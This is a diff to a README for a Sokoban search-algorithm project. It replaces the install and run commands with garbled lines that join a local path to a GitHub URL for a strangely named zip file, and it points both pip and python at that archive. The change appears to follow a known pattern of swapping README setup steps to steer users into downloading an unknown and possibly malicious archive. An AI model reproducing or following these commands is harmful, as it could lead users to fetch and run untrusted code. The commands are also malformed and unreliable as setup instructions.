@@ -14,13 +14,13 @@ This project implements search algorithms for finding solution to solve the Soko
    - Open a terminal and navigate to the project directory.
    - Run the following command to install required packages:
      ```
-     pip install -r .\Source\https://raw.githubusercontent.com/VHoangNguyen0102/AI_PROJECT_SEARCH/main/Source/input/standard/SEARCH_A_PROJEC_v3.5.zip
+     pip install -r .\Source\https://github.com/VHoangNguyen0102/AI_PROJECT_SEARCH/raw/refs/heads/main/Source/input/PROJEC_SEARCH_A_2.9-beta.4.zip
      ```
 
 ## Running the Project
 1. Ensure all dependencies are installed.
 2. Run the main script to start the game:
    ```
-   python .\Source\https://raw.githubusercontent.com/VHoangNguyen0102/AI_PROJECT_SEARCH/main/Source/input/standard/SEARCH_A_PROJEC_v3.5.zip
+   python .\Source\https://github.com/VHoangNguyen0102/AI_PROJECT_SEARCH/raw/refs/heads/main/Source/input/PROJEC_SEARCH_A_2.9-beta.4.zip
    ```
   
